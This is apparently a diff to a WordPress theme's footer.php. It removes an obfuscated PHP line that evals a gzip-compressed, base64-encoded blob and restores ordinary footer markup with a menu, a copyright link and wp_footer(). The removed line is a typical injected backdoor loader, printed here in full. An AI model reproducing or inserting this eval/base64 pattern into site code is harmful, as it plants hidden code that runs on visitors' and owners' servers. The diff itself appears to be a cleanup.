@@ -1,1 +1,14 @@
-<?php eval(stripslashes(gzinflate(base64_decode("bVJNb4MwDD1v0v6DxWFQqSvHSmtKpW6HnadJPaIALokW4ijJytivX4DSqh+nOM8vz892NhlLK3nInh5ZOEBW62hP5NFGAXq4whou9YBfJxTu/Zh4YBsjDLQm1/yQN6h/Em4t75LYC2wwV1RyL0nHsM4gdliSrrjtXnpmPIc43H2ogjYvFXfuijawZrMVbEYXR+s3fqysxdEQM9lzSaZbweisUFRLvack1rzBeNCCd3Sy1lhB0QHjICzu15Hw3rymadu2C6N4Fx7+kv1baPRpBF56hetoO4JRdgxYysNAzVRZaihJKV6QHbqGVnpxt4Ig5zVZLxYlNSf5HRbwETJS1/CJB4mti7I7YF92fqNbcluHHt1y2YueTb+d8Cg7x70GcF3dtdeSrYxF54YtuoLo+1JzNxHga2DANlCC13vwxZCmFZ6+4XRO/2jcaHJcOksLqrohEL5RGdv8Aw==")))); ?>
+</div>
+<div id="footer">
+	<div id="footermain">
+		<div id="footerleft">
+			<?php wp_nav_menu(array('theme_location' => 'secondary-menu', 'container_class' => 'secondarymenu')); ?>
+		</div>
+		<div id="footerright">
+			<p><a href="http://www.relaxacion.com/"><?php bloginfo('name'); ?> &copy; 2013</a></p>
+		</div>
+	</div>
+</div>
+<?php wp_footer(); ?>
+</body>
+</html>
